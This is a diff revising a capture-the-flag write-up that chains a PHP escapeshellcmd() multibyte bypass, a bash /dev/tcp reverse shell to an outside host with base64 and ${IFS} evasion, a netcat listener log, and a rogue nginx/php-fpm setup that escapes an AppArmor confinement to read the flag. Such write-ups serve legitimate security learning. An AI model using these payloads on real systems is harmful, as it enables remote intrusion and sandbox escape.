@@ -53,10 +53,13 @@ In fact, strings in PHP are just old-school byte sequences. All `mb_internal_enc
 ?>
 ```
 
-Great, so this allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from, but the most obvious one is `-H`, which allows us to specify a web browser to view the man page. `escapeshellcmd()` still escapes everything, but that escaping only works for the shell that PHP runs to execute `/usr/bin/man`. The shell that `/usr/bin/man` itself spawns to invoke the browser will see unescaped characters. This [gets us](get_shell.py) a reverse shell:
+Great, so this allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from; the most obvious one is `-H`, which allows us to specify a web browser to view the man page. `escapeshellcmd()` still escapes everything, but that actually works for us, not against:
+  * the shell that PHP runs to execute `/usr/bin/man` sees escaped characters, so they are not interpreted in any way and are just passed to the `-H` option of `/usr/bin/man` directly;
+  * however, *the shell that `/usr/bin/man` itself spawns to invoke the browser* sees unescaped characters.
+  
+This means we can use [the standard bash payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) to obtain a reverse shell. We only need to ensure we avoid spaces (they are not quoted by `escapeshellcmd()`, but can be replaced with `${IFS}`) and quotes (they are stripped unconditionally; we can base64-encode our payload to bypass this):
 ```python
 REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
-# Space is not escaped by escapeshellcmd(), so we have use $IFS here.
 SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
 CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'
 
@@ -67,9 +70,27 @@ requests.get(URL, params={
 })
 ```
 
-At this point, if we knew the name of the flag file, we could just `cat` it. Unfortunately, we don't:
-  1. We know the flag is stored in `/`, but its basename is 24 random characters, which is unguessable.
-  1. We can't get the basename from a directory listing either, since `/** mrixwlk` AppArmor policy, which `/usr/bin/man` is confined to, basically allows us to list files in any directory *except* the root one.
+This is not the end of it, because we still can't read the flag even with a shell:
+```
+PS> python .\get_shell.py [REDACTED_IP]
+[...]
+$ nc -lv 31337
+Listening on [0.0.0.0] (family 2, port 31337)
+Connection from [REDACTED_IP] received!
+bash: cannot set terminal process group (17): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@b5c29be1eabd:~/html$ ls -lh /
+ls -lh /
+ls: cannot open directory '/': Permission denied
+```
+
+The flag is stored in `/`, but its basename is 24 random characters, which is unguessable. And the AppArmor policy for `/usr/bin/man` allows us to list files in any directory *except* the root one:
+```
+www-data@b5c29be1eabd:~/html$ cat /etc/apparmor.d/usr.bin.man
+[...]
+/** mrixwlk,
+[...]
+```
 
 php-fpm, though, is not confined to any AppArmor policy. Even better, our reverse shell is running as `www-data` and we can talk to PHP via a UNIX socket (`/run/php/php7.3-fpm.sock`).
 
@@ -77,7 +98,7 @@ The obvious idea is to trick PHP into revealing the contents of `/`. PHP (php-fp
 In order to avoid that, we spin up another instance of `nginx` with a custom config pointed at `/tmp/evil`.
 
 ```
-www-data@2e75d56e6d85:/tmp/evil$ cat nginx.conf
+www-data@b5c29be1eabd:/tmp/evil$ cat nginx.conf
 pid /tmp/evil/evil.pid;
 events {}
 
@@ -103,24 +124,24 @@ If we omit it, php-fpm refuses to run scripts from `/tmp/evil` because its `open
 
 When we run `nginx` with this config, it complains that the error log is missing (I didn't find a way to make this warning go away), but runs anyway:
 ```
-www-data@2e75d56e6d85:/tmp/evil$ /usr/sbin/nginx -c /tmp/evil/nginx.conf
+www-data@b5c29be1eabd:/tmp/evil$ /usr/sbin/nginx -c /tmp/evil/nginx.conf
 nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (6: No such device or address)
-www-data@2e75d56e6d85:/tmp/evil$ cat evil.pid
-1045
+www-data@b5c29be1eabd:/tmp/evil$ cat evil.pid
+172
 ```
 
 Now all we need is a script that is going to be run by `php-fpm`:
 ```
-www-data@2e75d56e6d85:/tmp/evil$ cat evil.php
+www-data@b5c29be1eabd:/tmp/evil$ cat evil.php
 <?php foreach (glob("/flag*") as $fn) echo "$fn\n"; ?>
 ```
 
 And another one to orchestrate everything and finally get the flag:
 ```
-www-data@2e75d56e6d85:/tmp/evil$ cat fetch_evil.php
+www-data@b5c29be1eabd:/tmp/evil$ cat fetch_evil.php
 <?php echo(file_get_contents("http://127.0.0.1:31337/evil.php")); ?>
-www-data@2e75d56e6d85:/tmp/evil$ php -f fetch_evil.php
-/flag_kLExDVGQxbiIfwStYMFhT4xF.txt
-www-data@2e75d56e6d85:/tmp/evil$ cat /flag_kLExDVGQxbiIfwStYMFhT4xF.txt
+www-data@b5c29be1eabd:/tmp/evil$ php -f fetch_evil.php
+/flag_XaPrL5YjYmIhrOqxqSbUaE3u.txt
+www-data@b5c29be1eabd:/tmp/evil$ cat /flag_XaPrL5YjYmIhrOqxqSbUaE3u.txt
 hxp{maybe_this_will_finally_get_me_that_sweet_VC_money$$$}
 ```
